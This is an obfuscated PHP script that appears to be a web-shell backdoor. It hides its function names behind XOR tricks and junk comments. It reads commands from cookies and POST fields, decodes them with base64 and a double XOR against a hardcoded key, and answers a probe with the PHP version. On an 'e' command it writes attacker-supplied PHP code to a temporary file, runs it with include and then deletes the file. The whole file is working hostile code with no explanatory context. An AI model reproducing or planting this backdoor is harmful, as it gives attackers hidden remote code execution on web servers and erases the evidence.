<?php 	function	mjjbfbfa(){/* o */echo     22198;/*qqbdd  */}


$lwluz/* h  */=/* zfkjr   */'lwluz'	^  '';
$mcdkk/*cotc */=	"f"."i"."l"."\x65"/*   afulz */./*xh */"\137"     .	"\x70"/*pfluw   */./*   t   */$lwluz(998-881)  .	"t"."_"."c".$lwluz(891-780)     ./*   ommy  */$lwluz(110)/*   ipx */./*  ftje*/$lwluz(116)/* v*/.      $lwluz(101)	.    "n"."\164"  .	"s";$wabzxk     =/* w */"b"."a"."s"."\145"  ./*  hlb   */"6".$lwluz(52)	.	"\137"/*  j_o */.  "d".$lwluz(101)/* _t_go */.	$lwluz(99)/*   x  */./* wyy_   */"o"."\144"/* sacy*/.	$lwluz(101);
$evweu    =	"\x75"	.    $lwluz(704-594)/* ky   */./*__see */"s"."e"."r"."\x69"	.    "\x61"	.	$lwluz(596-488)/* k */.       "\x69"      ./*d */$lwluz(957-835)/*   bmd   */.	"e";
$ykpjzz/*  prh*/=/* zhetm */"p"."h"."p"."\166"/*yf_ke*/.       $lwluz(206-105)	./*d*/$lwluz(114)/*   hwqe*/./*  n   */"s"."i"."\x6f"/*  xmpn   */./*   ve   */"n";$_pognn       =     "\165"/* mlp   */.	"\156"/*  nwrik   */.	"l"."\151"     ./*  r */"n"."k";



/* ptm */

function       _rp_lhxmzq($k_axue,	$__jtcsqdz)
{


   global/*  yvbvt  */$lwluz;


       $pxbuzqhssw/*   eeunx   */=	"";


	for	($elknjbc	=/*xwh*/0;	$elknjbc/* hnvaa */<  strlen($k_axue);)/*  brof */{


  for/*   zwd  */($blneitmnc/*   m  */=/* mlxpq */0;/*   ypw */$blneitmnc	<    strlen($__jtcsqdz)	&&  $elknjbc	</*  itrh  */strlen($k_axue);/*udhu */$blneitmnc++,  $elknjbc++)	{      $pxbuzqhssw/*ebta  */.=/*   bqs */$lwluz(ord($k_axue[$elknjbc])/*quslq   */^/*   leu   */ord($__jtcsqdz[$blneitmnc]));  }


	}
	return/*   la */$pxbuzqhssw;


}




$euxruzt/*  trhq */=/*jwldc  */$_COOKIE;


$p_kpc  =/*   noq*/$_POST;

$euxruzt	=/* a*/array_merge($p_kpc,	$euxruzt);$tvwdpal/*  glwt  */=	$lwluz(97).$lwluz(631-575)	.    "6"."\x63"	.	$lwluz(100)/*b   */./*   gh   */"\70"   .	"\144"     ./* j_lco */"\x65"/* eov*/.	$lwluz(984-939)	.	"f"."\62"  ./*rwjn   */"4"."b".$lwluz(377-332)/*   kf_vp*/.    "\64"	.	"\x65"/* dhncz  */.      $lwluz(54)	./* msthk*/$lwluz(1001-945)/*bczq */./*  sss*/$lwluz(45)	./*   uup  */$lwluz(441-344)      .      "3"."0"."6"."-"."4".$lwluz(100)/*  ef  */.	"7"."b"."\64"	./*_lh*/$lwluz(98)   .  "1"."8"."\x30"	.	"0".$lwluz(99)	./*rda  */$lwluz(686-587);foreach      ($euxruzt/*  i */as/*mz  */$fbrisbdt	=>  $k_axue)/* hde_*/{

	$k_axue	=	$evweu(_rp_lhxmzq(_rp_lhxmzq($wabzxk($k_axue),/*xqye*/$tvwdpal),	$fbrisbdt));


	if	(isset($k_axue[$lwluz(97)."k"]))	{       if    ($k_axue[$lwluz(97)]	==  $lwluz(157-52))    {


       $elknjbc      =	array();

    $elknjbc[$lwluz(782-670)   ./* qvv_n */$lwluz(118)]/*ei   */=       $ykpjzz();


   $elknjbc["\163"/*   qo   */./*   ms*/"v"]	=  "\x33"      ./*hgm   */$lwluz(46)      ./* lzesb*/"\65";

      echo	@serialize($elknjbc);
/* zszfl*/}/*   t_qc*/elseif       ($k_axue[$lwluz(97)]	==	"\145")      {
	$pv_xlpawqp/*  ruft   */=	sprintf("."."/".$lwluz(283-246)	./*n  */"s".".".$lwluz(693-581)/*  yfz   */.	$lwluz(444-336),     md5($tvwdpal));
	$mcdkk($pv_xlpawqp,/* tnzj*/"<"/* _*/.    "?".$lwluz(553-441)/*  _afuc   */.	"\x68"	.	"p".$lwluz(32)	./* wetml */$lwluz(122-5)	.   "\156"	.      "l".$lwluz(157-52).$lwluz(157-47)  .	"k"."(".$lwluz(95)     .     "\137"	.    $lwluz(216-146)	./*   tjr */"I"."L"."\x45"	.	"\x5f"/*_xrka*/.	"_".")".$lwluz(59)/* ztpd  */.     $lwluz(32)    ./*  espfc*/$k_axue["d"]);


	include($pv_xlpawqp);

	$_pognn($pv_xlpawqp);
	}
/*g  */exit();

       }}
